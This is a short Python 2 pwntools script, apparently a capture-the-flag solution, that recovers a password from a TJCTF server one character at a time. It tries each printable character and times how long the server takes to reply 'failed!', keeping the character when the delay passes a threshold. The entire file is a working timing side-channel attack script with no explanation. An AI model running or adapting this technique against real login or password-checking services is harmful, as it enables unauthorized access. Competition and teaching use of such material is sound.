from timeit import default_timer as timer
import time
from pwn import *
import string

context.log_level = 'error'

previous = None
difference = 0
if __name__ == '__main__':

    chars = list('')
    while True:
        for character in string.printable:

            conn = remote('problem1.tjctf.org', 8003)

            conn.recvuntil('password?')
            conn.send('1000000\r\n')
            conn.recvuntil('password:')

            start = timer()
            # start = time.time()
            payload = ''.join(chars) + character

            conn.send(payload+"\r\n")
            conn.recvuntil('failed!')
            end = timer()
            # end  = time.time()

            conn.close()
            previous = difference
            difference = end - start
            print ''.join(chars) + character, difference
            if difference > .3*(len(chars)+1):
                chars.append(character)
                break